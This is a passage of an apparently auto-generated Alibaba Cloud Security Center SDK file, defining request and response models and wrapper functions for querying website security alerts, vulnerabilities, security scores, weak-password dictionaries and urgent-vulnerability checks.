*   **0**: Basic edition.
*   **1**: Advanced edition.
*   **2**: Enterprise edition.', example='1'),
      securityEventIds?: string(name='SecurityEventIds', description='The ID of the associated alert event.', example='270789'),
      solution?: string(name='Solution', description='The solution to the alert event.', example='A malicious program implanted by hacker after intrusion will occupy your bandwidth and attack other servers, and may affect you own service. The malicious process may also have self-deleting behavior or disguise as a system service to evade detection.'),
      stages?: string(name='Stages', description='The stage at which the attack or intrusion is detected.', example='[\\\\"authority_maintenance\\\\"]'),
      startTime?: long(name='StartTime', description='The timestamp generated when the alert event was first detected. Unit: milliseconds.', example='1543740301000'),
      suspiciousEventCount?: int32(name='SuspiciousEventCount', description='The total number of security alerts in your website assets.', example='1'),
      uuid?: string(name='Uuid', description='The unique ID of the associated instance.', example='47900178-885d-4fa4-9d77-****'),
    }
  ](name='AlarmList', description='The security alerts in your website assets.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='42'),
}

model DescribeDomainSecureAlarmListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureAlarmListResponseBody(name='body'),
}

/**
 * @summary Queries the security alert data of a website security report.
 *
 * @param request DescribeDomainSecureAlarmListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureAlarmListResponse
 */
async function describeDomainSecureAlarmListWithOptions(request: DescribeDomainSecureAlarmListRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureAlarmListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureAlarmList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security alert data of a website security report.
 *
 * @param request DescribeDomainSecureAlarmListRequest
 * @return DescribeDomainSecureAlarmListResponse
 */
async function describeDomainSecureAlarmList(request: DescribeDomainSecureAlarmListRequest): DescribeDomainSecureAlarmListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureAlarmListWithOptions(request, runtime);
}

model DescribeDomainSecureRiskListRequest {
  from?: string(name='From', description='The identifier of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='124.78.*.*'),
}

model DescribeDomainSecureRiskListResponseBody = {
  noSslCount?: int32(name='NoSslCount', description='The number of the websites for which no certificates are installed.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  riskCount?: int32(name='RiskCount', description='The number of risks.', example='1'),
  riskList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts.', example='1'),
      domain?: string(name='Domain', description='The domain name.', example='test.com'),
      sslBrand?: string(name='SslBrand', description='The issuer of the certificate.', example='globalsign'),
      sslStatus?: int32(name='SslStatus', description='Indicates whether the certificate is configured. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      uuidList?: [ string ](name='UuidList', description='The UUIDs of the backend servers of the website.'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities.', example='1'),
    }
  ](name='RiskList', description='The risks.'),
}

model DescribeDomainSecureRiskListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureRiskListResponseBody(name='body'),
}

/**
 * @summary Queries a list of risky websites in your website security report and the security information about the websites, including the number of vulnerabilities and the number of alerts.
 *
 * @param request DescribeDomainSecureRiskListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureRiskListResponse
 */
async function describeDomainSecureRiskListWithOptions(request: DescribeDomainSecureRiskListRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureRiskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureRiskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of risky websites in your website security report and the security information about the websites, including the number of vulnerabilities and the number of alerts.
 *
 * @param request DescribeDomainSecureRiskListRequest
 * @return DescribeDomainSecureRiskListResponse
 */
async function describeDomainSecureRiskList(request: DescribeDomainSecureRiskListRequest): DescribeDomainSecureRiskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureRiskListWithOptions(request, runtime);
}

model DescribeDomainSecureScoreRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.113.*.*'),
}

model DescribeDomainSecureScoreResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='11C96623-E106-59C9-866D-A6C82911****'),
  securityScore?: int32(name='SecurityScore', description='The security score of the website.', example='100'),
}

model DescribeDomainSecureScoreResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureScoreResponseBody(name='body'),
}

/**
 * @summary Queries the security score in your website security report. The full score is 100.
 *
 * @param request DescribeDomainSecureScoreRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureScoreResponse
 */
async function describeDomainSecureScoreWithOptions(request: DescribeDomainSecureScoreRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureScoreResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureScore',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security score in your website security report. The full score is 100.
 *
 * @param request DescribeDomainSecureScoreRequest
 * @return DescribeDomainSecureScoreResponse
 */
async function describeDomainSecureScore(request: DescribeDomainSecureScoreRequest): DescribeDomainSecureScoreResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureScoreWithOptions(request, runtime);
}

model DescribeDomainSecureStatisticsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values: Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='113.87.*.*'),
}

model DescribeDomainSecureStatisticsResponseBody = {
  alarmCount?: int32(name='AlarmCount', description='The number of domain names that trigger security alerts.', example='2'),
  noSslCount?: int32(name='NoSslCount', description='The number of the websites for which no certificates are installed.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
  riskCount?: int32(name='RiskCount', description='The number of the domain names that have security risks.', example='1'),
  totalDomainCount?: int32(name='TotalDomainCount', description='The total number of domain names.', example='72'),
  vulCount?: int32(name='VulCount', description='The number of the domain names that have vulnerabilities.', example='2'),
}

model DescribeDomainSecureStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics in your website security report, including the number of websites and the number of security events.
 *
 * @param request DescribeDomainSecureStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureStatisticsResponse
 */
async function describeDomainSecureStatisticsWithOptions(request: DescribeDomainSecureStatisticsRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics in your website security report, including the number of websites and the number of security events.
 *
 * @param request DescribeDomainSecureStatisticsRequest
 * @return DescribeDomainSecureStatisticsResponse
 */
async function describeDomainSecureStatistics(request: DescribeDomainSecureStatisticsRequest): DescribeDomainSecureStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureStatisticsWithOptions(request, runtime);
}

model DescribeDomainSecureSuggestsRequest {
  lang?: string(name='Lang', description='Sets the language type for requests and received messages, default is **zh**. Values:
- **zh**: Chinese
- **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The IP address of the access source.', example='218.249.*.*'),
}

model DescribeDomainSecureSuggestsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for this request, which can be used to troubleshoot and locate issues.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
  riskSuggest?: string(name='RiskSuggest', description='Overall suggestions for security reinforcement.', example='Use the security center, such as security alerts, vulnerability scanning, and vulnerability fixes, to resolve security risks as soon as possible.'),
  totalCount?: int32(name='TotalCount', description='Total number of security recommendations.', example='4'),
  vulSuggest?: long(name='VulSuggest', description='Suggestions for vulnerability repair.', example='If your business cannot promptly fix vulnerabilities in high-risk applications, we recommend that you enable the cloud firewall IPS feature to intercept malicious attacks on the network side.'),
  webLockSuggest?: string(name='WebLockSuggest', description='Suggestions for website tamper prevention.', example='The website tamper-proofing feature is recommended to prevent the website from being maliciously injected into external links, and being tampered with as malicious information, causing serious negative social impact to the enterprise.'),
}

model DescribeDomainSecureSuggestsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureSuggestsResponseBody(name='body'),
}

/**
 * @summary Query Network Security Report - Security Suggestions
 *
 * @param request DescribeDomainSecureSuggestsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureSuggestsResponse
 */
async function describeDomainSecureSuggestsWithOptions(request: DescribeDomainSecureSuggestsRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureSuggestsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureSuggests',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Network Security Report - Security Suggestions
 *
 * @param request DescribeDomainSecureSuggestsRequest
 * @return DescribeDomainSecureSuggestsResponse
 */
async function describeDomainSecureSuggests(request: DescribeDomainSecureSuggestsRequest): DescribeDomainSecureSuggestsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureSuggestsWithOptions(request, runtime);
}

model DescribeDomainSecureVulListRequest {
  from?: string(name='From', description='The identifier of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='111.196.*.*'),
  type?: string(name='Type', description='The vulnerability type. Valid values:

*   **app**: application vulnerability.', example='app'),
}

model DescribeDomainSecureVulListResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerabilities returned.', example='100'),
  vulList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CESA-2023:3555: python Security Update'),
      asapCount?: int32(name='AsapCount', description='The number of the vulnerabilities that have the **high** priority.', example='50'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1639371446000'),
      handledCount?: int32(name='HandledCount', description='The number of handled vulnerabilities.', example='33'),
      laterCount?: int32(name='LaterCount', description='The number of the vulnerabilities that have the **medium** priority.', example='30'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170574'),
      nntfCount?: int32(name='NntfCount', description='The number of the vulnerabilities that have the **low** priority.', example='20'),
      tags?: string(name='Tags', description='The tag that is added to the vulnerability. Valid values:

*   Restart required
*   Remote utilization
*   EXP exists
*   Available
*   Elevation of Privilege
*   Code Execution', example='Code Execution'),
      type?: string(name='Type', description='The type of the vulnerability. Default value: cve. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by network scanning.
*   **sca**: application vulnerability that is detected by using software component analysis.', example='app'),
    }
  ](name='VulList', description='The domain name-related vulnerabilities.'),
}

model DescribeDomainSecureVulListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainSecureVulListResponseBody(name='body'),
}

/**
 * @summary Queries a list of vulnerabilities in your website security report.
 *
 * @param request DescribeDomainSecureVulListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainSecureVulListResponse
 */
async function describeDomainSecureVulListWithOptions(request: DescribeDomainSecureVulListRequest, runtime: Util.RuntimeOptions): DescribeDomainSecureVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainSecureVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of vulnerabilities in your website security report.
 *
 * @param request DescribeDomainSecureVulListRequest
 * @return DescribeDomainSecureVulListResponse
 */
async function describeDomainSecureVulList(request: DescribeDomainSecureVulListRequest): DescribeDomainSecureVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainSecureVulListWithOptions(request, runtime);
}

model DescribeDynamicDictRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='101.204.XX.XX'),
}

model DescribeDynamicDictResponseBody = {
  count?: int32(name='Count', description='The number of weak password rules that are added.', example='1'),
  fileName?: string(name='FileName', description='The name of the OSS object that contains custom weak passwords.', example='test_dict.plain'),
  fileSize?: long(name='FileSize', description='The size of the OSS object. Unit: bytes.', example='40'),
  limit?: int32(name='Limit', description='The maximum number of weak password rules that can be added.', example='9'),
  ossUrl?: string(name='OssUrl', description='The IP address of the Object Storage Service (OSS) object.', example='cloudtest01/661767e1-5ae3-4ec5-865f-03039436893a/sacc2*****'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  uploadTime?: long(name='UploadTime', description='The timestamp when the OSS object was uploaded. Unit: milliseconds.', example='1719919421'),
}

model DescribeDynamicDictResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDynamicDictResponseBody(name='body'),
}

/**
 * @summary Queries custom weak password rules for the baseline check feature.
 *
 * @param request DescribeDynamicDictRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDynamicDictResponse
 */
async function describeDynamicDictWithOptions(request: DescribeDynamicDictRequest, runtime: Util.RuntimeOptions): DescribeDynamicDictResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDynamicDict',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries custom weak password rules for the baseline check feature.
 *
 * @param request DescribeDynamicDictRequest
 * @return DescribeDynamicDictResponse
 */
async function describeDynamicDict(request: DescribeDynamicDictRequest): DescribeDynamicDictResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDynamicDictWithOptions(request, runtime);
}

model DescribeDynamicDictUploadInfoRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.103.XX.XX'),
}

model DescribeDynamicDictUploadInfoResponseBody = {
  accessid?: string(name='Accessid', description='The AccessKey ID that is used to access OSS.', example='LTAI4G1mgPbjvG********'),
  expire?: string(name='Expire', description='The validity period of the signature. The value is a UNIX timestamp.', example='1719919893'),
  host?: string(name='Host', description='The OSS endpoint.', example='https://aegis-update-static-file.oss-cn-hangzhou.aliyuncs.com'),
  key?: string(name='Key', description='The name of the OSS object.', example='DegradePool_Offset_****'),
  policy?: string(name='Policy', description='The OSS security policy.', example='eyJleHBpcmF0aW9uIjoiMjAyNC0wNy0wMlQxMTozMTozMy40MjlaIiwiY29uZGl0aW9********'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61***'),
  signature?: string(name='Signature', description='The signature that is calculated based on **AccessKeySecret** and **Policy**. When you call an OSS API operation, OSS uses the signature information to check the validity of the POST request.', example='wBiwkhd5LGcLzijtc3FhI****'),
}

model DescribeDynamicDictUploadInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDynamicDictUploadInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about an uploaded Object Storage Service (OSS) object that contains custom weak passwords and is used for baseline checks.
 *
 * @param request DescribeDynamicDictUploadInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDynamicDictUploadInfoResponse
 */
async function describeDynamicDictUploadInfoWithOptions(request: DescribeDynamicDictUploadInfoRequest, runtime: Util.RuntimeOptions): DescribeDynamicDictUploadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDynamicDictUploadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about an uploaded Object Storage Service (OSS) object that contains custom weak passwords and is used for baseline checks.
 *
 * @param request DescribeDynamicDictUploadInfoRequest
 * @return DescribeDynamicDictUploadInfoResponse
 */
async function describeDynamicDictUploadInfo(request: DescribeDynamicDictUploadInfoRequest): DescribeDynamicDictUploadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDynamicDictUploadInfoWithOptions(request, runtime);
}

model DescribeEmgUserAgreementResponseBody = {
  auth?: boolean(name='Auth', description='Indicates whether Security Center is authorized to scan for urgent vulnerabilities. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='768BB9F5-8AF3-557F-A489-9BDD64CB3E4C'),
}

model DescribeEmgUserAgreementResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeEmgUserAgreementResponseBody(name='body'),
}

/**
 * @summary Queries whether Security Center is authorized to scan for urgent vulnerabilities.
 *
 * @param request DescribeEmgUserAgreementRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeEmgUserAgreementResponse
 */
async function describeEmgUserAgreementWithOptions(runtime: Util.RuntimeOptions): DescribeEmgUserAgreementResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeEmgUserAgreement',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whether Security Center is authorized to scan for urgent vulnerabilities.
 *
 * @return DescribeEmgUserAgreementResponse
 */
async function describeEmgUserAgreement(): DescribeEmgUserAgreementResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgUserAgreementWithOptions(runtime);
}

model DescribeEmgVulItemRequest {
  checkType?: int32(name='CheckType', description='The check method. Valid values:

*   **0**: proof of concept (POC) verification
*   **1**: version comparison', example='0'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  riskStatus?: string(name='RiskStatus', description='Specifies whether the vulnerability poses risks.\\\\
If you do not specify this parameter, all vulnerabilities are queried regardless of whether the vulnerabilities pose risks. Valid values:

*   **y**: yes
*   **n**: no', example='y'),
  scanType?: string(name='ScanType', description='The method that is used to detect the vulnerability.\\\\
If you do not specify this parameter, all vulnerabilities are queried regardless of which method is used. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='python'),
  vulName?: string(name='VulName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
}

model DescribeEmgVulItemResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
      checkType?: int32(name='CheckType', description='The check method.', example='1'),
      gmtLastCheck?: long(name='GmtLastCheck', description='The timestamp when the urgent vulnerability was last detected. Unit: milliseconds.', example='1619286031000'),
      gmtPublish?: long(name='GmtPublish', description='The timestamp when the vulnerability was disclosed. Unit: milliseconds.', example='1618887687000'),
      name?: string(name='Name', description='The name of the detection rule.', example='scan:AVD-2021-179344'),
      pendingCount?: int32(name='PendingCount', description='The number of unhandled urgent vulnerabilities.', example='0'),
      progress?: int32(name='Progress', description='The progress of the urgent vulnerability detection task. Valid values: 0 to 100.

>  This parameter takes effect only when an urgent vulnerability is being detected.', example='50'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported. Valid values:

*   **0**: no
*   **1**: yes

>  If this parameter is not returned, the application protection is not supported.', example='1'),
      status?: int32(name='Status', description='The detection status of the urgent vulnerability. Valid values:

*   **10**: The urgent vulnerability is not detected.
*   **20**: The urgent vulnerability is being detected.
*   **30**: The urgent vulnerability detection is complete.', example='30'),
      type?: string(name='Type', description='The method that is used to detect the urgent vulnerability. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='scan'),
    }
  ](name='GroupedVulItems', description='The information about the urgent vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC1868ED-A0E1-4D1C-BF7E-10DC0C34B3C3'),
  totalCount?: int32(name='TotalCount', description='The total number of the urgent vulnerabilities returned.', example='1'),
}

model DescribeEmgVulItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeEmgVulItemResponseBody(name='body'),
}

/**
 * @summary Queries the details of urgent vulnerabilities.
 *
 * @param request DescribeEmgVulItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeEmgVulItemResponse
 */
async function describeEmgVulItemWithOptions(request: DescribeEmgVulItemRequest, runtime: Util.RuntimeOptions): DescribeEmgVulItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.vulName)) {
    query['VulName'] = request.vulName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEmgVulItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of urgent vulnerabilities.
 *
 * @param request DescribeEmgVulItemRequest
 * @return DescribeEmgVulItemResponse
 */
async function describeEmgVulItem(request: DescribeEmgVulItemRequest): DescribeEmgVulItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgVulItemWithOptions(request, runtime);
}

model DescribeEventLevelCountRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers. If you specify multiple values, separate them with commas (,).', example='c951761046a9c4afe92be0a7b5bexxxxx'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='xxxxxx30389a10c28f6d38f2398f0dcexxxxxxx922b9e8290dc7c3019d4a8,48b87f2c0662e334820f436cb9133f1ae4e053d39b6fad42xxxxxxxxxx'),
